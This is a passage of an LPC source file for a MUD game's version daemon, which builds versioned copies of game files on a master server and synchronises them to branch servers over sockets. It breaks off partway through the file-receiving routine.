// versiond.c

#include <ansi.h>
#include <runtime_config.h>
#include <getconfig.h>
#include <net/socket.h>
#include <version.h>
#include <mudlib.h>

#pragma optimize
#pragma save_binary

inherit F_DBASE;
inherit F_SAVE;

// 版本同步代理進程所在的服務器的IP地址
//#define AGENT_IP  ({ "127.0.0.1", "61.184.100.7", "202.110.119.87", "218.89.171.162", "219.134.89.94", "221.202.78.197" }) 
#define AGENT_IP  ({ "127.0.0.1", "202.110.119.87", "218.89.171.162", "219.134.89.94", "221.202.78.197" }) 

// 刪除命令
#define RM_CMD          "/cmds/wiz/rm"

// 保存版本文件的目錄：這個目錄由於需要和普通文件路徑名進行
// 連接使用，所以不能以"/"結尾，這一點和globals.h中的許多路
// 徑名不一樣，因此這個宏也不定義在那裏。
#define VERSION_DIR     "/version"

// 保存版本文件數據的變量(在DBASE變量中的路徑)
#define FILES           "/files"
#define STATS           "/stats"

// 在服務器端，數據庫信息中應該只有FILES， 記錄了所有再版本
// 中的文件的修改時間，以供客户端用來比較是否有差別。
// 在客户端，數據庫信息中有FILES和STATS， 其中FILES包含了本
// 地使用的所有文件的版本(即在服務器上文件的最後修改時間)，
// 含義和服務器端的FILES數據是相同的。但是STATS則是最後一次
// 同步版本的時候，生成的文件的時間。這樣，在下一次同步版本
// 的時候，如果FILES內的數據相同，就看STATS和本地文件的時間
// 是否吻合，如果不吻合，説明雖然服務器沒有修改這個文件，但
// 是本地這個文件卻已經發生過變化，所以仍然需要同步。
// 注意：STATS和FILES是不同構的，對於所有的源文件".c"來説，
// 在FILES中記錄的是".c"的路徑，而在STATS記錄的是".b"的路徑，
// 這是因為FILES面對服務器文件，而STATS面對本地文件。

// VERSIOND的BUG
// 在編譯生成版本的時候，get_file_version函數會調用一個模擬
// 外部函數：binary_valid，來檢查某一個源文件的二進制代碼是
// 否過期，這是一個DOING增強的函數，需要修改MUDOS才能夠使用，
// 如果你不想修改MUDOS，可以在simul_efun 中自行書寫，但是這
// 樣會顯著的降低效率而導致事實無法使用，因此可以採用變通的
// 方式，即簡單的比較源文件和二進制文件的時間，而不檢查他的
// 繼承對象和嵌入文件。這樣在生成版本的時候就需要格外小心。
// 使用了增強的EFUN函數以後，也並不能保證完全正確。這是因為
// 該函數只檢查了第一層繼承關係，如果再上一層繼承的文件過時
// 了，該函數就無法檢查。因此在每次修改一個文件從新編譯的時
// 候，最好考慮使用updatei 來更新整個繼承鏈表，雖然這樣仍然
// 有可能出現問題，但是機率將會相當的小。如果變化比較複雜，
// 建議全部重新編譯。

// 從版本服務器取回的文件後綴
#define APPENDFIX       ".svr"

// 監聽的端口(以MUD的啟動端口為基準)
#define VERSION_PORT    12

// 不需要構造的目錄
nosave string *exclude_dir = ({ "/adm/etc", "/adm/simul_efun", "/adm/tmp",
                                "/data", "/dump", "/temp", "/binaries", VERSION_DIR,
                                "/backup", "/log", "/u", "/www" });
// 額外需要構造的文件
nosave string *include_dir = ({ "/data/e2c_dict.o", "/data/emoted.o", "/data/newsd.o",
                                "/adm/etc/quest", "/adm/etc/preload", "/adm/etc/database.h" });

// 需要發佈C源程序的目錄
nosave string *release_src = ({ "/clone/misc/wedding-ring.c",
                                "/clone/npc/pet.c",
                                "/clone/npc/magic-beast.c",
                                "/clone/misc/workroom.c",
                                "/clone/misc/cruise-ob.c",
                                "/d/room/%*s" });

// 保存二進制代碼的路徑
nosave string bin_path;

// 各地連接的信息
nosave mapping socket_info;

// 客户端的連接信息
nosave mixed *client_info = 0;

// 版本通訊的SOCKET
nosave int vfd;
nosave int version_ok;

// build_version整理版本時使用的變量
nosave int total_error;
nosave int total_count;
nosave int total_finish;
nosave mixed *total_build;

// 手工獲得文件列表
string *fetch_file_list = 0;

#if 0
#define DEBUG_LOG(s)       tell_object(find_player("lonely"), s)
#else
#define DEBUG_LOG(s)
#endif

#define T_DEBUG(str) CHANNEL_D->do_channel(this_object(), "debug", str)

// 提供給外部的函數
int generate_version();
int build_cancel();
int build_path(string path);
int synchronize_version();
int fetch_file(string file);
int clear_syn_info();
int is_version_ok();
int is_boot_synchronizing();
int is_release_server();
int is_need_release_source(string path);
int append_sn(string file);

// 內部使用的函數
protected void setup();
protected void sys_info(string msg);
protected void debug_info(string msg);
protected int  connect_server();
protected void build_init_data();
protected void build_finish();
protected void build_version(string path, mapping here);
protected int  build_pure_file(mixed *path_info);
protected int  get_file_version(string path);
protected void send_command(int fd, string cmd);
protected int  send_client_pending_msg();
protected void syn_receive_result(string str);
protected int  syn_receive_file(buffer buf);
protected void syn_load_file(string file, int ver);
protected void syn_load_version(string path, mapping store);
protected void syn_finish();
protected void syn_reboot_mud();
protected void syn_fetch_file_from_server();
protected void syn_check_version_file();
protected void syn_read_callback(int fd, mixed str);
protected void syn_write_callback(int fd);
protected void syn_close_callback(int fd);
protected void in_listen_callback(int fd);
protected void in_read_callback(int fd, string str);
protected void in_write_callback(int fd);
protected void in_close_callback(int fd);
protected void parse_cmd(int fd);
protected void cmd_getver(int fd, string arg);
protected void cmd_get(int fd, string arg);
protected void send_file(int fd, string file, string peer_name);
protected void syn_get_version_data();
protected int  send_pending_msg(int fd);
protected int  send_result(int fd, string msg);
protected int  send_error_msg(int fd, string msg);
protected void send_version(int fd);
protected void remove_connection(int fd);
protected void cmd_close(int fd, string arg);

string query_save_file() { return DATA_DIR + "versiond"; }

int clean_up() { return 0; }

#ifdef RUN_IN_WINDOWS
int binary_valid(string file)
{
        return 1;
}
#endif

void create()
{
        seteuid(getuid());
        restore();

        // 初始化一些信息
        //bin_path = get_config(__SAVE_BINARIES_DIR__);
        bin_path = "/binaries";
        set("channel_id", "版本精靈");

        // 還沒有檢查版本
        version_ok = 0;
        total_build = 0;

        // 啟動初始化
        setup();
}

// 析構函數
void remove(string euid)
{
        if (! this_player())
                return;

        if (sizeof(socket_info) > 0)
                error("版本精靈：目前正在有站點和本站同步版本，你不能摧毀版本精靈。\n");

        if (! version_ok && vfd)
                error("版本精靈：目前版本正在同步中，你不能摧毀版本精靈。\n");
}

protected void setup()
{
        if (RELEASE_SERVER() == "local")
        {
                // 總站的版本是不需要同步更新的
                version_ok = 1;

                // 2s以後提供版本服務功能
                call_out("in_server", 2);
        } else
        if (stringp(RELEASE_SERVER()) &&
            sscanf(RELEASE_SERVER(), "%*s %*d") == 2)
        {
                // 這裏是分站，嘗試和總站進行同步
                if (this_player())
                {
                        // 不是系統自動啟動的，因此不檢查版本
                        version_ok = 1;
                        write("你重新啟動了版本精靈。\n");
                        return;
                }

                // 2s以後和總站同步版本
                call_out("synchronize_version", 2);
        } else
        {
                // 配置信息不正確
                write("配置信息(/adm/etc/config)錯誤，沒有指明版本服務器(release server)。\n");
                version_ok = 1;
                return;
        }
}

// 提供版本服務
protected void in_server()
{
        int port;

        // 這裏是版本發佈站點，在該端口上監聽分站的請求
        // 創建版本通訊的SOCKET
        vfd = socket_create(STREAM_BINARY,
                            "in_read_callback",
                            "in_close_callback" );

        if (vfd < 0)
        {
                log_file("version", sprintf("%s Failed to create socket.\n", log_time()));
                return;
        }

        // 然後綁定SOCKET
        port = __PORT__ + VERSION_PORT;
        
        if (socket_bind(vfd, port) < 0)
        {
                log_file("version", sprintf("%s Failed to bind socket.\n", log_time()));
                socket_close(vfd);
                return;
        }

        // 最後監聽
        if (socket_listen(vfd, "in_listen_callback" ) < 0)
        {
                log_file("version", sprintf("%s Failed to listen to socket.\n", log_time()));
                return;
        }

        // 初始化連接信息
        socket_info = ([ ]);
}

// 在本機上生成版本
int generate_version()
{
        mapping dbase;
        string file;
        mapping store;

        if (RELEASE_SERVER() != "local")
                return notify_fail("只有在版本發佈的MUD中才能生成最新版本。\n");

        if (! is_root(previous_object()))
                return 0;

        if (query_heart_beat() || arrayp(total_build))
                return notify_fail("現在正在整理版本。\n");

        if (! binary_valid(VERSION_D + ".c"))
                return notify_fail("請先更新(update)版本精靈，以保證它是最新版本。\n");

        if (sizeof(socket_info) > 0)
                return notify_fail("目前正在有站點和本站同步版本，你不能構造版本。\n");
                
        // 如果生成了core文件，則刪除之
        rm("/core");

        // 將原先所有的版本信息數據保存到臨時變量中
        set_temp(FILES, query(FILES));
        delete(FILES);

        // 重新設置數據
        set("VERSION_NO", time());

        log_file("version", sprintf("%s new version [%d] now generated.\n",
                                    log_time(), query("VERSION_NO")));

        // 構造/目錄下面的版本
        store = ([ ]);
        set(FILES, store);

        // 初始化整理信息
        build_init_data();
        
        message_system("系統正在生成可以執行的發佈版本，您的遊戲速度可能會受到影響。\n");
        write("開始生成版本...\n");

        build_version("/", store);

        // 構造所有額外文件的版本
        foreach (file in include_dir)
                build_version(file, 0);

        // 開始心跳，進行版本整理
        set_heart_beat(1);
        log_file("version", sprintf("%s %s start build version.\n",
                                    log_time(), this_player() ? geteuid(this_player()) : "SYSTEM"));

        return 1;
}

// 終止生成版本
int build_cancel()
{
        if (! arrayp(total_build))
                return notify_fail("現在並沒有正在生成版本。\n");

        // 清除版本號
        set("VERSION_NO", 0);
        save();

        // 清空數據
        build_finish();

        // 停止心跳
        set_heart_beat(0);
        write("終止了正在生成版本的操作：目前的版本介於兩種版本之間，可能會導致不穩定。\n");
        return 1;
}

// 心跳函數：整理版本中所有的普通文件
protected void heart_beat()
{
        int n;
        int percent;
        mixed *piece;

        if (! arrayp(total_build))
        {
                // 現在沒有版本可以整理
                set_heart_beat(0);
                return;
        }

        n = 0;
        while (n < 100 && sizeof(total_build))
        {
                // 整理某一個目錄
                reset_eval_cost();
                piece = total_build[0];
                total_build = total_build[1..<1];
                n += build_pure_file(piece) + 1;
        }

        total_finish += n;
        if (total_count < total_finish) total_count = total_finish;

        percent = total_finish * 100 / total_count;
        if (percent / 10 != query_temp("last_prompt") / 10)
        {
                // 每過10%則提示一下所有用户。
                message_system("系統整理版本中，已經完成 " + percent + "%...");
                set_temp("last_prompt", percent);
        } else
                sys_info("已經完成 " + percent + "%...");

        if (sizeof(total_build))
                return;

        // 整理完畢
        save();
        log_file("version", sprintf("%s Total %d error when generate version [%d]\n",
                                    log_time(), total_error, query("VERSION_NO")));
        sys_info("版本整理完畢。在生成版本中一共發生了 " + total_error + " 個錯誤。");
        message_system("系統生成版本完畢。\n");

        // 還原數據
        build_finish();

        set_heart_beat(0);
}

// 生成一個新的版本號
int build_new()
{
        int ver;

        if (! is_root(previous_object()))
                return notify_fail("只有ROOT_UID才有權限調用這個函數。\n");

        // 判斷現在的狀態
        if (arrayp(total_build))
                return notify_fail("現在正在整理版本。\n");

        // 生成新的版本號
        set("VERSION_NO", ver = time());
        save();
        write(sprintf("生成了新的版本號：%d\n", ver));
        return 1;
}

// 生成某個路徑下面的版本
int build_path(string path)
{
        if (! is_root(previous_object()))
                return notify_fail("只有ROOT_UID才有權限調用這個函數。\n");

        if (sizeof(socket_info) > 0)
                write("目前正在有站點和本站同步版本，不建議更改版本。\n");
                
        // 去掉末尾的"/"
        while (strlen(path) > 1 && path[strlen(path) - 1] == '/')
                path = path[0..<2];

        if (file_size(path) == -1)
                return notify_fail("沒有對應這個路徑名的文件或是路徑，不能進入版本。\n");

        bin_path = get_config(__SAVE_BINARIES_DIR__);
        if (path[0..strlen(bin_path) - 1] == bin_path)
                return notify_fail("二進制文件不需要進入版本。\n");

        // 判斷現在的狀態
        if (arrayp(total_build))
                return notify_fail("現在正在整理版本。\n");

        if (! binary_valid(VERSION_D + ".c"))
                return notify_fail("請先更新(update)版本精靈，以保證它是最新版本。\n");

        // 如果生成了core文件，則刪除之
        rm("/core");

        build_init_data();
        write("現在開始整理版本。\n");
        build_version(path, 0);

        log_file("version", sprintf("%s %s start build path(%s).\n",
                                    log_time(),
                                    this_player() ? geteuid(this_player()) : "SYSTEM",
                                    path));
        if (sizeof(total_build))
                // 有純文件需要build，啟動心跳
                set_heart_beat(1);
        else
        {
                save();
                write("整理完畢。\n");
                build_finish();
        }

        return 1;
}

// 初始化構造的數據
protected void build_init_data()
{
        total_build = ({ });
        total_error = 0;
        total_count = 0;
        total_finish = 0;
}

// 結束構造的數據
protected void build_finish()
{
        total_build = 0;
        total_error = 0;
        total_count = 0;
        total_finish = 0;

        // 這是用來提示的變量
        set_temp("last_prompt", 0);

        // 去掉記錄文件版本所使用的臨時變量
        delete_temp(FILES);
}

// build_version在運行中把需要整理的信息加入到total_build這
// 個數據集合中，其中組織方式如下：
// total_build ----+-- 目錄信息1 --+-- 全路徑名
//                 |               |
//                 |               +-- 簡單文件名集合
//                 |
//                 +---目錄信息2 --+-- 全路徑名
//                 |               |
//                 |               +-- 簡單文件名集合
//                 ...
// total_error 錯誤的數量

// 完成某個路徑的構造
// 返回該路徑下文件的數目
protected int build_pure_file(mixed *path_info)
{
        int count;
        string path;
        mapping here;
        string pname;
        string file;
        int ver;

        // 取整理的全路徑名
        path = path_info[0];

        // 保證版本目錄下建立了合適的路徑(包括二進制路徑)
        assure_file(VERSION_DIR + bin_path + path + "???");
        assure_file(VERSION_DIR + path + "???");

        // 去掉最後的'/'，用來做dbase的query操作。
        if (strlen(path) > 1) pname = path[0..<2];

        // 查看是否有為這個路徑準備好版本數據結構，如果沒有
        // 就創建數據結構
        if (! mapp(here = query(FILES + pname)))
        {
                here = ([ ]);
                set(FILES + pname, here);
        }

        // 取所有的文件的版本
        count = 0;
        foreach (file in path_info[1])
        {
                // 這是一個普通文件
                if (! (ver = get_file_version(path + file)))
                        total_error++;
                else
                        here[file] = ver;
                count++;
        }

        return count;
}

// 構造某個路徑下面的版本
protected void build_version(string path, mapping here)
{
        mixed piece;
        mixed *files;
        string *pure_files;
        int ver;

        if (member_array(path, exclude_dir) != -1)
                // 這個文件不需要進入版本，直接返回成功
                return;

        if (! mapp(here))
        {
                // 沒有指定存放生成的版本信息的位置，檢查這
                // 個路徑的屬性：普通文件還是目錄
                switch (file_size(path))
                {
                case -1:
                        // 沒有這個目錄或是文件，直接繼續
                        return;
        
                case -2:
                        // 這是一個目錄，我首先需要確保生成合適的映
                        // 射數據
                        here = ([ ]);
                        set(FILES + path, here);
                        break;
        
                default:
                        // 這是一個普通文件，直接生成版本信息

                        // 首先保證版本目錄下建立了合適的路徑(包括二進制路徑)
                        assure_file(VERSION_DIR + bin_path + path + "???");
                        assure_file(VERSION_DIR + path + "???");

                        if ((ver = get_file_version(path)) > 0)
                                set(FILES + path, ver);
                        return;
                }
        }

        // 取這個路徑下面的所有文件
        if (path[strlen(path) - 1] != '/') path += "/";
        files = get_dir(path, -1);
        if (! arrayp(files))
                // 沒有這個路徑
                return 0;

        // 提示
        sys_info("正在整理路徑：" + path);

        // 遍歷本目錄下面的所有文件
        foreach (piece in files)
        {
                reset_eval_cost();
                switch (piece[1])
                {
                case -2:
                        // 這是一個目錄，構造下一級的數據
                        here[piece[0]] = ([ ]);
                        build_version(path + piece[0], here[piece[0]]);
                        piece[0] = 0;
                        break;

                default:
                        // 這是一個普通文件，略過，留待稍候整理
                        break;
                }
        }

        // 構造目錄信息，以待整理程序整理
        pure_files = map_array(files, (: ((mixed *) $1)[0] :));
        pure_files -= ({ 0 });
        if (sizeof(pure_files))
        {
                total_build += ({ ({ path, pure_files }) });
                total_count += 1 + sizeof(pure_files);
        }
}

// 是否需要發佈源程序
int is_need_release_source(string path)
{
        string *files;
        string match;

        foreach (match in release_src)
                if (path == match || sscanf(path, match) == 1)
                        return 1;

        return 0;
}

// 返回文件的最新時間(C則返回二進制代碼的時間)作為版本
protected int get_file_version(string path)
{
        int last;
        mixed *st, *cst;
        string bpath;
        string cpath;
        object ob;
        object *uobs;
        int ver;
        int need_reload;

        cst = stat(path);
        if (! arrayp(cst) || sizeof(cst) < 2 || cst[0] < 0)
        {
                // 沒有找到這個文件？
                log_file("version", sprintf("%s can't find file: %s\n",
                                            log_time(), path));
                return 0;
        }

        last = strlen(path) - 2;
        if (last > 0 && path[last + 1] == 'c' && path[last] == '.' &&
            ! is_need_release_source(path))
        {
                // 這是一個不能發佈的c文件，我必須取它的二進
                // 制代碼文件
                bpath = bin_path + path[0..last] + "b";
                st = stat(bpath);
                if (! arrayp(st) || sizeof(st) < 2)
                        // 沒有這個文件
                        need_reload = 1;
                else
                if (st[0] == -2)
                {
                        // 這是一個目錄
                        RM_CMD->rm_dir(bin_path);
                        need_reload = 1;
                } else
#if 1
                if (! binary_valid(path))
                        // 該文件需要重新編譯
                        need_reload = 1;
#else
                // doing 在這裏削弱了判斷的重新編譯的條件，
                // 只要BIN文件的生成時間不老於C文件的時間就
                // 認為不需要編譯，這是為了避免構造版本花費
                // 太多的時間。每次修改一些文件以後建議使用
                // updatei 編譯所有繼承文件。
                if (st[1] < cst[1])
                        // 該文件需要重新編譯
                        need_reload = 1;
#endif

                if (need_reload)
                {
                        // 沒有最新的binaries文件，我需要重
                        // 新編譯這個文件。
                        if (objectp(ob = find_object(path)))
                        {
                                // 找到了這個OBJECT，記錄裏面的人物
                                uobs = filter_array(all_inventory(ob), (: playerp :));
                                uobs->move(VOID_OB, 1);
                                destruct(ob);
                        }

                        // 重新載入OBJECT
                        reset_eval_cost();
                        catch(ob = load_object(path));
                        if (objectp(ob) && sizeof(uobs))
                                // 移動人物回原先的OBJECT
                                uobs->move(ob, 1);

                        if (file_size(bpath) < 0)
                        {
                                // 還沒有這個文件？有可能是
                                // 編譯出錯
                                log_file("version", sprintf("%s can't get binaries: %s\n",
                                                            log_time(), path));
                                return 0;
                        }

                        // 這個BIN肯定是剛剛生成的，直
                        // 接返回。
                        ver = time();
                } else
                        // 返回BIN文件的生成時間作為版本號
                        ver = st[1];

                // 記錄需要複製的源文件名字(C需要複製BIN文件)
                cpath = bpath;
        } else
        {
                // 不是c文件，直接返回時間作為版本號
                ver = cst[1];

                // 記錄需要複製的源文件名字(普通文件直接複製)
                cpath = path;
        }

        // 如果現在文件的版本和最後一次整理時的版本不一致，
        // 或是版本目錄中沒有這個文件，則將運行中的文件複製
        // 到版本目錄中去。注意：這裏有一個缺陷，那就是如果
        // 修改了版本目錄中的文件，那麼系統並不會檢查，而是
        // 認為該文件版本仍然正確。所以修改VERSION 下面的文
        // 件是絕對被禁止的。
        switch (file_size(VERSION_DIR + cpath))
        {
        case -2:
                // 版本中存放的是一個路徑。那麼我需
                // 要先移走這個路徑。
                sys_info(sprintf("file(%s) is a path in version dir, removed.", cpath));
                RM_CMD->rm_dir(VERSION_DIR + cpath);
                break;
        case -1:
                break;

        default:
                // 這個文件已經存在，比較記錄的版本信息
                if (ver == query_temp(FILES + path))
                        // 版本相同，返回即可。
                        return ver;
        }

        // 需要複製這個文件進入版本路徑
        cp(cpath, VERSION_DIR + cpath);
        last = strlen(cpath) - 2;

        if (cpath[last] == '.' && (cpath[last + 1] == 'c' || cpath[last + 1] == 'h'))
                // 源程序，需要增加完整性ID
                append_sn(VERSION_DIR + cpath);

        return ver;
}

// 獲得服務器上的文件
int fetch_file(string file)
{
        object me;

        if (RELEASE_SERVER() == "local")
                return notify_fail("在版本發佈站點上無需從服務器上獲得文件。\n");

        if (arrayp(client_info) && client_info[STATUS] != STATUS_FINISHED)
                return notify_fail("現在版本正在同步中。\n");

        if (find_call_out("syn_reboot_mud") != -1)
                return notify_fail("現在版本精靈正在重新啟動遊戲，無法同步。\n");

        fetch_file_list = ({ file });

        if (objectp(me = this_player(1)))
                set_temp("operator", filter_color(me->name(1)) + "(" +
                                     geteuid(me) + ")");
        else
                delete_temp("operator");

        if (! connect_server())
                return 0;

        write("正在連接服務器獲取文件。\n");
        return 1;
}

// 同步主機版本
int synchronize_version()
{
        object me;

        if (RELEASE_SERVER() == "local")
                return notify_fail("在版本發佈站點上無需同步最新版本。\n");

        if (arrayp(client_info) && client_info[STATUS] != STATUS_FINISHED)
                return notify_fail("現在版本正在同步中。\n");

        if (find_call_out("syn_reboot_mud") != -1)
                return notify_fail("現在版本精靈正在重新啟動遊戲，無法同步。\n");

        // 清除變量，保證同步版本
        fetch_file_list = 0;

        if (objectp(me = this_player(1)))
                set_temp("operator", filter_color(me->name(1)) + "(" +
                                     geteuid(me) + ")");
        else
                delete_temp("operator");

        // 設置標誌：版本還沒有成功的同步
        version_ok = 0;
        delete_temp("version_changed");
        
        if (! connect_server())
                return 0;
                
        write("你開始和服務器同步版本。\n");
        return 1;
}

protected int connect_server()
{
        string addr, port;
        int ret_val;

        // 創建版本通訊的SOCKET
        vfd = socket_create(STREAM_BINARY,
                            "syn_read_callback",
                            "syn_close_callback" );

        if (vfd < 0)
        {
                log_file("version", sprintf("%s Failed to create socket.\n",
                                            log_time()));
                return notify_fail("無法創建SOCKET.\n");
        }

        // 初始化客户端信息
        client_info = allocate(8);
        client_info[STATUS] = STATUS_CONNECTING;
        client_info[FILE_NAME] = 0;
        client_info[FILE_POS] = 0;
        client_info[FILE_SIZE] = 0;
        client_info[RESULT_BUFFER] = "";
        client_info[PENDING_WRITE] = ({ });

        if (sscanf(RELEASE_SERVER(), "%s %d", addr, port) != 2)
        {
                log_file("version", sprintf("%s Bad address(%s) of server.\n",
                                            log_time(), RELEASE_SERVER()));
                return notify_fail("配置的版本服務器的地址不正確。\n");
        }

        // 生成版本服務器的連接地址
        addr = sprintf("%s %d", addr, port + VERSION_PORT);

        ret_val = socket_connect(vfd, addr,
                                 "syn_read_callback",
                                 "syn_write_callback");
        if (ret_val != EESUCCESS)
        {
                log_file("version", sprintf("%s Failed to connect server.\n",
                                            log_time()));
                return notify_fail("無法連接版本服務器。\n");
        }

        log_file("version", sprintf("%s connecting to server %s.\n",
                                    log_time(), addr));
        return 1;
}

// 清除同步信息
int clear_syn_info()
{
        int result;
        int fd;

        if (previous_object() && ! is_root(previous_object()))
                return 0;

        // 服務器端：清除套接字的連接信息
        if (is_release_server())
        {
                if (sizeof(socket_info) > 0)
                {
                        foreach (fd in keys(socket_info))
                                if (intp(fd)) socket_close(fd);

                        socket_info = ([ ]);
                        return 1;
                }

                return 0;
        }

        // 客户端：清除同步的SOCKET和信息
        if (vfd)
        {
                log_file("version", sprintf("%s 暫停了同步版本的操作。\n", log_time()));
                syn_finish();
                return 1;
        }

        return 0;
}

// 版本是否正常
int is_version_ok() { return version_ok; }

// 是否正在進行啟動時同步版本
int is_boot_synchronizing()
{
        if (! version_ok && ! stringp(query_temp("operator")))
                return 1;           
}

// 是否是版本發佈服務器
int is_release_server() { return RELEASE_SERVER() == "local"; }

// 測試
#if 0
mixed query_client_info() { return client_info; }
int query_vfd() { return vfd; }
#endif

// 獲得連接信息
mixed query_socket_info()
{
        if (previous_object() && ! is_root(previous_object()))
                return 0;
        
        return socket_info;
}

// 從服務器獲得文件
protected void syn_get_file(string file)
{
        if (client_info[STATUS] != STATUS_SYN)
                return;
        
        send_command(vfd, "get " + file);
}

// 從服務器獲得版本數據
protected void syn_get_version_data()
{
        if (client_info[STATUS] != STATUS_GET_VERSION)
                return;
        
        // 更改狀態成為正在獲得文件
        client_info[STATUS] = STATUS_GET_VERSION_DATA;
        send_command(vfd, "getver dbase");
}

// 向服務器端發送命令
void send_command(int fd, string cmd)
{
        if (! fd)
                // 檢查當前連接的VFD
                if (! (fd = vfd)) return;
                

        cmd += "\n";
        if (sizeof(client_info[PENDING_WRITE]))
        {
                // 已經有阻塞需要發送的數據了，這次發送的數
                // 據先阻塞
                client_info[PENDING_WRITE] += ({ cmd });
                return;
        }

        switch (socket_write(fd, cmd))
        {
        case EESUCCESS:
        case EECALLBACK:
                // 發送成功了
                return;

        case EEWOULDBLOCK:
                // 發送數據阻塞
                client_info[PENDING_WRITE] += ({ cmd });
                call_out("syn_write_callback", 2, fd);
                return;

        default:
                // 發送失敗
                client_info[PENDING_WRITE] += ({ cmd });
                return;
        }
}

// 客户端發送阻塞的消息
protected int send_client_pending_msg()
{
        string msg;

        msg = client_info[PENDING_WRITE][0];
        switch (socket_write(vfd, msg))
        {
        case EESUCCESS:
                // 發送成功了
                client_info[PENDING_WRITE] = client_info[PENDING_WRITE][1..<1];
                return 0;

        case EECALLBACK:
                // 需要等待
                client_info[PENDING_WRITE] = client_info[PENDING_WRITE][1..<1];
                return -1;

        case EEWOULDBLOCK:
                // 發送數據阻塞
                call_out("syn_write_callback", 2, vfd);
                return -1;

        default:
                // 發送失敗
                return -1;
        }
}

// 同步時客户端連接的讀回調函數
// 由於服務器可能會返回兩種數據：1 普通應答信息  2 二進制文
// 件數據。因此接收函數依據狀態中的文件名字存在與否來鑑別這
// 兩種狀態：如果有文件名字，那麼就認為是接收文件中，如果沒
// 有，則是接收普通應答信息。普通應答信息一定是固定個字節，
// 以ASCII 方式存放。如果一次接收沒有滿足期望的字節，那麼長
// 度將保存在FILE_POS裏面。
protected void syn_receive_result(string str)
{
        string file;
        string msg;
        int len;
        int ver;
        string op;

        if ((len = strsrch(str, '\n')) == -1)
        {
                // 返回的信息不正確 - 必須包含'\n'
                log_file("version", sprintf("%s respond without '\\n' from server: %s.\n",
                                            log_time(), str));
                DEBUG_LOG(sprintf(HIR "error syntax str = %s\n" NOR, str));
                return;
        }
        if (! len) return;
        str = str[0..len - 1];

        DEBUG_LOG(sprintf("str = %s\n", str));
        op = query_temp("operator");

        if (sscanf(str, RESULT_ERR "%s", msg))
        {
                // 遇到了錯誤，先記錄進入日誌
                log_file("version", sprintf("%s error respond: %s\n",
                                            log_time(), msg));
                DEBUG_LOG(str + "\n");
        }

        // 根據當前的狀態進行處理
        switch (client_info[STATUS])
        {
        case STATUS_GET_VERSION:
                // 正在讀取版本
                if (sscanf(str, RESULT_VERSION "%d", ver))
                {
                        // 返回了版本
                        log_file("version", sprintf("%s get version from server: %d\n",
                                                    log_time(), ver));

                        // 開始獲得版本文件
                        if (query("VERSION_NO") != ver)
                        {
                                if( !query("manual_synchronize", stringp(op) && CONFIG_D) )
                                {
                                        // 系統自舉，並且設置了手工同步版本的標誌
                                        sys_info(sprintf("%s本地版本需要更新，但是系統"
                                                         "並不自動同步。\n"));
                                        version_ok = 1;
                                        set_temp("version_changed", 0);
                                        syn_finish();
                                        break;
                                }

                                // 版本不一致
                                log_file("version", sprintf("%s local version(%O) is not ok.\n",
                                                            log_time(), query("VERSION_NO")));
                                if (stringp(op))
                                {
                                        // 顯示提示信息
                                        sys_info(sprintf("%s要求同步版本，本地的"
                                                         "版本(%O)需要更新為(%O)。",
                                                         op, query("VERSION_NO"), ver));
                                        message_system(sprintf("%s正在進行運行中同步版本。", op));
                                }

                                set_temp("version_changed", 1);
                                syn_get_version_data();
                        } else
                        {
                                // 版本一致
                                log_file("version", sprintf("%s local version ok.\n", log_time()));
                                if (stringp(op = query_temp("operator")))
                                        // 顯示提示信息
                                        sys_info(sprintf("%s要求同步版本，但是本地"
                                                         "版本已經和服務器保持一致了。", op));
                                version_ok = 1;
                                set_temp("version_changed", 0);
                                syn_finish();
                        }
                        break;
                }

                // 沒有返回正常的版本信息
                log_file("version", sprintf("%s can not get version. server report: %s\n",
                                            log_time(), str));

                // 怎麼辦？只有結束同步
                syn_finish();
                break;

        case STATUS_GET_VERSION_DATA:
                // 獲得版本數據，執行和STATUS_GET_SYN相同

        case STATUS_SYN:
                // 接收文件的長度
                if (! sscanf(str, RESULT_FILE "%s %d", file, len))
                {
                        if (sscanf(str, RESULT_FINISH "%*s"))
                        {
                                log_file("version", sprintf("%s version synchronized.\n",
                                                            log_time()));
                                if (stringp(op))
                                        message_system(sprintf("%s已經將版本更新完畢。", op));
                                // 同步完畢，保存版本信息
                                save();
                                version_ok = 1;

                                // 讀取news/chinesed/emoted
                                reset_eval_cost();
                                catch(NEWS_D->restore());
                                catch(CHINESE_D->restore());
                                catch(EMOTE_D->restore());
                                syn_finish();
                        }

                        break;
                }

                DEBUG_LOG(sprintf("file: %s len = %d\n", file, len));

                // 記錄的接收文件狀態和信息
                if (client_info[STATUS] == STATUS_GET_VERSION_DATA)
                        // 正在讀取版本信息，更正文件名字
                        file = query_save_file() + __SAVE_EXTENSION__;

                // 記錄傳送來的文件的信息
                client_info[FILE_NAME] = file;
                client_info[FILE_POS] = 0;
                client_info[FILE_SIZE] = len;

                // 如果有，刪除這個文件的臨時文件
                rm(file + APPENDFIX);

                sys_info(sprintf("getting(%s)...", file));
                break;

        default:
                // 不應該接收到信息
        }
}

// 接收文件內容
protected int syn_receive_file(buffer buf)
{
        mixed *st;
        string file;
        int len;
        int sl;

        file = client_info[FILE_NAME];
        len =  client_info[FILE_SIZE] - client_info[FILE_POS];
        if (len > sizeof(buf))
                // 不需要將buf中的數據全部寫入
                len = sizeof(buf);

        write_buffer(file + APPENDFIX,
                     client_info[FILE_POS], buf[0..len - 1]);
        client_info[FILE_POS] += len;
        if (client_info[FILE_POS] < client_info[FILE_SIZE])
                // 文件還沒有接收完畢
                return len;

        // 成功獲取文件完畢
        log_file("version", sprintf("%s got file %s.\n",
                                    log_time(), client_info[FILE_NAME]));
        client_info[FILE_POS] = 0;
        client_info[FILE_NAME] = 0;
        client_info[FILE_SIZE] = 0;

        // 查看當前的狀態
        switch (client_info[STATUS])
        {
        case STATUS_GET_VERSION_DATA:
                // 獲得了版本數據，讀取數據
                file += APPENDFIX;
                rm(file + __SAVE_EXTENSION__);
                rename(file , file + __SAVE_EXTENSION__);

                // 在靜態數據中記錄本地的文件版本和文件信息
                set_temp(FILES, query(FILES));
                set_temp(STATS, query(STATS));
                delete(FILES);
                delete(STATS);

                if (! restore_object(file))
                {
                        log_file("version", sprintf("%s can not read version-dbase got from server.\n",
                                                    log_time()));
                        rm(file + __SAVE_EXTENSION__);
                        syn_finish();
                        return sizeof(buf);
                }

                // 刪除該文件
                rm(file + __SAVE_EXTENSION__);

                // 開始同步所有的文件
                syn_check_version_file();
                break;

        case STATUS_SYN:
                // 將文件名字修改為正常的名字
                rm(file);
                rename(file + APPENDFIX, file);

                // 如果這個文件是一個C文件，那麼我必須刪除
                // 它的BIN 文件，因為我需要重新編譯它。
